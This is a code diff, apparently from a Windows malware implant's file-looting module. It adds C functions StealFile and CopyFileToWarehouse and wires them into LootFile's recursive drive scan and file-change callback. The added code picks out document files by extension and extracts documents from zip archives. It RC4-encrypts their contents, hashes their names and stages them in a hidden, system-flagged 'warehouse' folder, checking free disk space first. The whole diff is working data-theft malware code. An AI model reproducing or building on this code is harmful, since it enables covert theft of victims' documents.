@@ -1387,6 +1387,145 @@ VOID FreePivotProfile
 	}
 }
 
+VOID CopyFileToWarehouse
+(
+	_In_ LPWSTR lpPath,
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	LPWSTR lpWarehouse = NULL;
+	PBYTE pFileData = NULL;
+	DWORD cbFileData = 0;
+	LPWSTR lpFileName = NULL;
+	LPSTR lpTemp = NULL;
+	PBYTE pNameDigest = NULL;
+	LPWSTR lpNameHexDigest = NULL;
+	WCHAR wszDriveName[] = L"A:\\";
+	DWORD dwSectorsPerCluster = 0;
+	DWORD dwBytesPerSector = 0;
+	DWORD dwNumberOfFreeClusters = 0;
+	DWORD dwTotalNumberOfClusters = 0;
+	DWORD dwPercentFull = 0;
+
+	PrintFormatW(L"%s\n", lpPath);
+	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 1);
+	if (!IsFolderExist(lpWarehouse)) {
+		CreateDirectoryW(lpWarehouse, NULL);
+		SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	}
+
+	wszDriveName[0] += PathGetDriveNumberW(lpWarehouse);
+	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
+		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
+		goto CLEANUP;
+	}
+
+	dwPercentFull = (dwNumberOfFreeClusters * 100) / dwTotalNumberOfClusters;
+	if (dwPercentFull <= 15) {
+		goto CLEANUP;
+	}
+
+	pFileData = ReadFromFile(lpPath, &cbFileData);
+	if (pFileData == NULL) {
+		goto CLEANUP;
+	}
+
+	Rc4EncryptDecrypt(pFileData, cbFileData, pConfig->lpRecipientPubKey, lstrlenA(pConfig->lpRecipientPubKey));
+	lpFileName = PathFindFileNameW(lpPath);
+	lpTemp = ConvertWcharToChar(lpFileName);
+	pNameDigest = ComputeSHA256(lpTemp, lstrlenA(lpTemp));
+	lpNameHexDigest = ConvertBytesToHexW(pNameDigest, SHA256_HASH_SIZE);
+	lpNameHexDigest[SHA256_HASH_SIZE] = L'\0';
+	lstrcatW(lpWarehouse, L"\\");
+	lstrcatW(lpWarehouse, lpNameHexDigest);
+	if (!WriteToFile(lpWarehouse, pFileData, cbFileData)) {
+		goto CLEANUP;
+	}
+
+CLEANUP:
+	FREE(lpWarehouse);
+	FREE(pFileData);
+	FREE(lpTemp);
+	FREE(pNameDigest);
+	FREE(lpNameHexDigest);
+}
+
+BOOL StealFile
+(
+	_In_ LPWSTR lpPath,
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	DWORD i = 0;
+	DWORD j = 0;
+	DWORD k = 0;
+	LPWSTR lpExtension = NULL;
+	LPWSTR lpExtension2 = NULL;
+	PITEM_INFO* ItemList = NULL;
+	PITEM_INFO pItem = NULL;
+	DWORD dwNumberOfItems = 0;
+	LPWSTR lpTempPath = NULL;
+
+	if (StrStrW(lpPath, L"RECYCLE.BIN")) {
+		goto CLEANUP;
+	}
+
+	lpExtension = PathFindExtensionW(lpPath);
+	if (lpExtension[0] != L'\0') {
+		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
+			if (!lstrcmpiW(lpExtension, pConfig->DocumentExtensions[i])) {
+				CopyFileToWarehouse(lpPath, pConfig);
+				goto CLEANUP;
+			}
+		}
+
+		for (i = 0; i < pConfig->cArchiveExtensions; i++) {
+			if (!lstrcmpiW(lpExtension, pConfig->ArchiveExtensions[i])) {
+				PrintFormatW(L"Zip file: %s\n", lpPath);
+				ItemList = ExtractFromZip(lpPath, NULL, TRUE, &dwNumberOfItems);
+				if (ItemList == NULL) {
+					continue;
+				}
+
+				for (j = 0; j < dwNumberOfItems; j++) {
+					pItem = ItemList[j];
+					if (pItem == NULL || pItem->pFileData == NULL) {
+						continue;
+					}
+
+					lpExtension2 = PathFindExtensionW(pItem->lpPath);
+					if (lpExtension2[0] != L'\0') {
+						for (k = 0; k < pConfig->cDocumentExtensions; k++) {
+							if (!lstrcmpiW(lpExtension2, pConfig->DocumentExtensions[k])) {
+								lpTempPath = GenerateTempPathW(NULL, NULL, NULL);
+								if (WriteToFile(lpTempPath, pItem->pFileData->pBuffer, pItem->pFileData->cbBuffer)) {
+									CopyFileToWarehouse(lpTempPath, pConfig);
+									DeleteFileW(lpTempPath);
+								}
+
+								FREE(lpTempPath);
+							}
+						}
+					}
+				}
+
+				break;
+			}
+		}
+	}
+
+CLEANUP:
+	if (ItemList != NULL) {
+		for (j = 0; j < dwNumberOfItems; j++) {
+			FreeItemInfo(ItemList[j]);
+		}
+
+		FREE(ItemList);
+	}
+
+	return FALSE;
+}
+
 BOOL LootFileCallback
 (
 	_In_ PFILE_NOTIFY_INFORMATION pNotifyInfo,
@@ -1394,7 +1533,7 @@ BOOL LootFileCallback
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	PrintFormatW(L"%s\n", lpPath);
+	StealFile(lpPath, pConfig);
 	return FALSE;
 }
 
@@ -1413,28 +1552,6 @@ CLEANUP:
 	return;
 }
 
-BOOL StealFileCallback
-(
-	_In_ LPWSTR lpPath,
-	_In_ PGLOBAL_CONFIG pConfig 
-)
-{
-	DWORD i = 0;
-	LPWSTR lpExtension = NULL;
-
-	lpExtension = PathFindExtensionW(lpPath);
-	if (lpExtension[0] != L'\0') {
-		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
-			if (!lstrcmpiW(lpExtension, pConfig->DocumentExtensions[i])) {
-				CopyFileW()
-			}
-		}
-	}
-	
-
-	return FALSE;
-}
-
 VOID LootFile
 (
 	_In_ PGLOBAL_CONFIG pConfig
@@ -1446,9 +1563,6 @@ VOID LootFile
 	WCHAR wszSystem32[MAX_PATH];
 	LPWSTR lpTemp = NULL;
 
-	/*CreateDirectoryW(pConfig->wszWarehouse, NULL);
-	SetFileAttributesW(pConfig->wszWarehouse, FILE_ATTRIBUTE_HIDDEN);
-	SetFileAttributesW(pConfig->wszWarehouse, FILE_ATTRIBUTE_SYSTEM);*/
 	pLootParameter = ALLOC(sizeof(LOOT_ARGS));
 	pLootParameter->lpPath = ALLOC(MAX_PATH * sizeof(WCHAR));
 	pLootParameter->pConfig = pConfig;
@@ -1486,6 +1600,6 @@ VOID LootFile
 			continue;
 		}
 
-		ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFileCallback, pConfig);
+		ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
 	}
 }
